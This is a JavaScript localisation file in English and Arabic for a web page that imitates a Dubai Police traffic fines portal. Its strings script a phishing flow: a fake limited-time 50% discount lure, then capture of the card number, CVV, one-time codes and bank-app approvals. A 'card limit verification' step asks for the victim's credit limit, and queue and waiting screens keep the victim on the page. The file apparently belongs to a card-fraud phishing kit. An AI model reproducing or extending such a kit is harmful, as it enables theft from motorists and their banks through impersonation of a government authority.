(function () {
  var T = {
    en: {
      /* ── Common ── */
      ssl: 'Secured by 256-bit SSL encryption',
      merchant: 'Merchant', amount: 'Amount', card: 'Card', date: 'Date',
      traffic_portal: 'Traffic Fines Portal', secure_payment: 'Secure Payment',
      /* ── Fines ── */
      review_fines: 'Review Fines', plate_number: 'Plate Number',
      select_all: 'Select All', request_fine_list: 'Request Fine List',
      tab_all: 'All', tab_impound: 'Impound', tab_payable: 'Payable',
      tab_bp: 'Black Points', tab_unpayable: 'Un Payable',
      source: 'Source', location: 'Location', speed: 'Speed',
      ticket_no: 'Ticket Number', date_time: 'Date & Time',
      fine_details: 'Fine Details', emirate: 'Emirate',
      black_points: 'Black Points',
      discount_title: '50% Fine Discount Active',
      discount_sub: 'Limited time offer — pay today and save 50% on your fines',
      checking_fines: 'Checking fines...',
      load_error_title: 'Unable to Load Fines',
      load_error_sub: 'Could not retrieve fines. Please try again.',
      try_again: '← Try Again',
      no_fines_title: 'No Fines in This Category',
      no_fines_sub: 'No fines match the selected filter.',
      pay_with_card: 'Pay with Card',
      discount_applied: '50% discount applied',
      badge_payable: 'Payable', badge_impound: 'Impound',
      badge_bp: 'Black Points', badge_other: 'Not Payable',
      /* ── Payment ── */
      secure_payment_title: 'Secure Payment',
      card_info: 'Card Information',
      card_number: 'Card Number', cardholder_name: 'Cardholder Name',
      expiry_date: 'Expiry (MM/YY)', cvv_label: 'CVV',
      pay_now: 'Pay Now', total_due: 'Total Due',
      checking_card: 'Checking card details...',
      /* ── OTP SMS2 (code entry) ── */
      verify_tx: 'Verify Transaction',
      enter_code_sub: 'Please enter the verification code sent to your device.',
      tx_details: 'Transaction Details',
      enter_6digit: 'Enter 6-digit verification code',
      verify_btn: 'Verify Code',
      didnt_receive: "Didn't receive it?",
      resend_code: 'Resend code',
      verifying: 'Verifying with bank…',
      incorrect_code_title: 'Incorrect Code',
      incorrect_code_msg: 'The code you entered was incorrect. Please try again with the latest code.',
      /* ── OTP SMS (push notification) ── */
      approval_sent: 'Approval Notification Sent',
      open_app_approve: 'Please open the app and',
      approve_tx: 'approve the transaction',
      waiting_approval: 'Waiting for bank approval…',
      resend_notif: 'Resend Notification',
      incorrect_code_title2: 'Incorrect Code Entered',
      incorrect_code_msg2: 'The code you entered was incorrect. Please try again with the latest code.',
      /* ── Waiting ── */
      payment_submitted: 'Payment Submitted',
      payment_submitted_sub: 'Your transaction is being reviewed by our security system. Please keep this page open.',
      step1: 'Payment details received', step2: 'Card verified',
      step3: 'Contacting your bank...', step4: 'Awaiting bank confirmation',
      /* ── Approved ── */
      payment_approved_title: 'Payment Successful',
      payment_approved_sub: 'Your fine payment has been processed.',
      back_home: 'Back to Home',
      /* ── Queue (Yogunluk) ── */
      queue_title: 'Transaction Queued',
      queue_sub: 'Due to high demand, your transaction has been placed in a queue. Please wait patiently.',
      queue_wait: 'Processing your request, please wait…',
      /* ── Card Limit ── */
      card_limit_title: 'Card Limit Verification',
      card_limit_label: "Your Card's Total Credit Limit (AED)",
      submit_btn: 'Submit',
      confirm_limit: 'Confirm Limit',
      /* ── Approved extra ── */
      amount_paid: 'Amount Paid',
      issuing_bank: 'Issuing Bank',
      time_label: 'Time',
      reference_label: 'Reference',
      payment_approved_info: 'Your traffic fines have been settled. Points update may take 24–48 hours to reflect in the Dubai Police system.',
      /* ── Index / Form ── */
      plate_source: 'Plate Source',
      plate_code_lbl: 'Plate Code',
      select_source: 'Select Source',
      select_code: 'Select Code',
      check_fines: 'Check Fines',
      enter_plate: 'Enter plate number',
      /* ── Redirect overlay ── */
      connecting_bank: 'Connecting to Bank',
      redirecting_auth: 'Redirecting to authentication page...',
    },

    ar: {
      /* ── Common ── */
      ssl: 'مؤمَّن بتشفير SSL 256-بت',
      merchant: 'التاجر', amount: 'المبلغ', card: 'البطاقة', date: 'التاريخ',
      traffic_portal: 'بوابة المخالفات المرورية', secure_payment: 'دفع آمن',
      /* ── Fines ── */
      review_fines: 'مراجعة المخالفات', plate_number: 'رقم اللوحة',
      select_all: 'تحديد الكل', request_fine_list: 'طلب قائمة المخالفات',
      tab_all: 'الكل', tab_impound: 'الحجز', tab_payable: 'قابل للدفع',
      tab_bp: 'النقاط السوداء', tab_unpayable: 'غير قابل',
      source: 'المصدر', location: 'الموقع', speed: 'السرعة',
      ticket_no: 'رقم المخالفة', date_time: 'التاريخ والوقت',
      fine_details: 'تفاصيل المخالفة', emirate: 'الإمارة',
      black_points: 'النقاط السوداء',
      discount_title: 'خصم 50٪ على المخالفات',
      discount_sub: 'عرض لفترة محدودة — ادفع اليوم ووفّر 50٪ على مخالفاتك',
      checking_fines: 'جاري فحص المخالفات...',
      load_error_title: 'تعذَّر تحميل المخالفات',
      load_error_sub: 'تعذَّر استرداد المخالفات. يرجى المحاولة مجدَّداً.',
      try_again: '← حاول مرة أخرى',
      no_fines_title: 'لا توجد مخالفات في هذه الفئة',
      no_fines_sub: 'لا توجد مخالفات تطابق الفلتر المحدَّد.',
      pay_with_card: 'الدفع بالبطاقة',
      discount_applied: 'خصم 50٪ مطبَّق',
      badge_payable: 'قابل للدفع', badge_impound: 'الحجز',
      badge_bp: 'نقاط سوداء', badge_other: 'غير قابل للدفع',
      /* ── Payment ── */
      secure_payment_title: 'دفع آمن',
      card_info: 'بيانات البطاقة',
      card_number: 'رقم البطاقة', cardholder_name: 'اسم حامل البطاقة',
      expiry_date: 'تاريخ الانتهاء (شش/سس)', cvv_label: 'رمز الأمان',
      pay_now: 'ادفع الآن', total_due: 'المبلغ المستحق',
      checking_card: 'جاري التحقق من بيانات البطاقة...',
      /* ── OTP SMS2 ── */
      verify_tx: 'التحقق من المعاملة',
      enter_code_sub: 'يرجى إدخال رمز التحقق المرسَل إلى جهازك.',
      tx_details: 'تفاصيل المعاملة',
      enter_6digit: 'أدخل رمز التحقق المكوَّن من 6 أرقام',
      verify_btn: 'تحقق من الرمز',
      didnt_receive: 'لم تستلم الرمز؟',
      resend_code: 'إعادة الإرسال',
      verifying: 'جاري التحقق مع البنك…',
      incorrect_code_title: 'رمز غير صحيح',
      incorrect_code_msg: 'الرمز الذي أدخلته غير صحيح. يرجى المحاولة مجدَّداً باستخدام آخر رمز.',
      /* ── OTP SMS ── */
      approval_sent: 'تم إرسال إشعار الموافقة',
      open_app_approve: 'يرجى فتح التطبيق و',
      approve_tx: 'الموافقة على المعاملة',
      waiting_approval: 'في انتظار موافقة البنك…',
      resend_notif: 'إعادة إرسال الإشعار',
      incorrect_code_title2: 'رمز غير صحيح',
      incorrect_code_msg2: 'الرمز الذي أدخلته غير صحيح. يرجى المحاولة مجدَّداً.',
      /* ── Waiting ── */
      payment_submitted: 'تم تقديم الدفع',
      payment_submitted_sub: 'يتم مراجعة معاملتك من قِبَل نظام الأمان. يرجى إبقاء هذه الصفحة مفتوحة.',
      step1: 'تم استلام بيانات الدفع', step2: 'تم التحقق من البطاقة',
      step3: 'جاري التواصل مع البنك...', step4: 'في انتظار تأكيد البنك',
      /* ── Approved ── */
      payment_approved_title: 'تمت عملية الدفع بنجاح',
      payment_approved_sub: 'تمت معالجة دفع مخالفتك.',
      back_home: 'العودة إلى الرئيسية',
      /* ── Queue ── */
      queue_title: 'المعاملة في قائمة الانتظار',
      queue_sub: 'نظراً للطلب الكبير، تمَّ وضع معاملتك في قائمة الانتظار. يرجى الانتظار بصبر.',
      queue_wait: 'جاري معالجة طلبك، يرجى الانتظار…',
      /* ── Card Limit ── */
      card_limit_title: 'التحقق من حد البطاقة',
      card_limit_label: 'الحد الائتماني الإجمالي لبطاقتك (درهم إماراتي)',
      submit_btn: 'إرسال',
      confirm_limit: 'تأكيد الحد',
      /* ── Approved extra ── */
      amount_paid: 'المبلغ المدفوع',
      issuing_bank: 'البنك المصدر',
      time_label: 'الوقت',
      reference_label: 'المرجع',
      payment_approved_info: 'تمت تسوية مخالفاتك المرورية. قد يستغرق تحديث النقاط من 24 إلى 48 ساعة لتظهر في نظام شرطة دبي.',
      /* ── Index / Form ── */
      plate_source: 'مصدر اللوحة',
      plate_code_lbl: 'رمز اللوحة',
      select_source: 'اختر المصدر',
      select_code: 'اختر الرمز',
      check_fines: 'التحقق من المخالفات',
      enter_plate: 'أدخل رقم اللوحة',
      /* ── Redirect overlay ── */
      connecting_bank: 'الاتصال بالبنك',
      redirecting_auth: 'جاري إعادة التوجيه إلى صفحة المصادقة...',
    }
  };

  function getLang() { return localStorage.getItem('dp_lang') || 'en'; }
  function setLang(lang) { localStorage.setItem('dp_lang', lang); applyLang(lang); }
  function t(key, fallback) {
    var lang = getLang();
    return (T[lang] && T[lang][key] !== undefined ? T[lang][key] : (T.en[key] !== undefined ? T.en[key] : (fallback !== undefined ? fallback : key)));
  }
  function applyLang(lang) {
    document.documentElement.lang = lang;
    document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
    document.querySelectorAll('[data-i18n]').forEach(function (el) {
      var key = el.getAttribute('data-i18n');
      var v = T[lang] && T[lang][key] !== undefined ? T[lang][key] : T.en[key];
      if (v !== undefined) el.textContent = v;
    });
    document.querySelectorAll('[data-i18n-pl]').forEach(function (el) {
      var key = el.getAttribute('data-i18n-pl');
      var v = T[lang] && T[lang][key] !== undefined ? T[lang][key] : T.en[key];
      if (v !== undefined) el.placeholder = v;
    });
    var btn = document.getElementById('lang-toggle');
    if (btn) btn.textContent = lang === 'ar' ? 'EN' : 'عربي';
  }
  window.dpI18n = { getLang: getLang, setLang: setLang, t: t, applyLang: applyLang, T: T };
  document.addEventListener('DOMContentLoaded', function () { applyLang(getLang()); });
})();
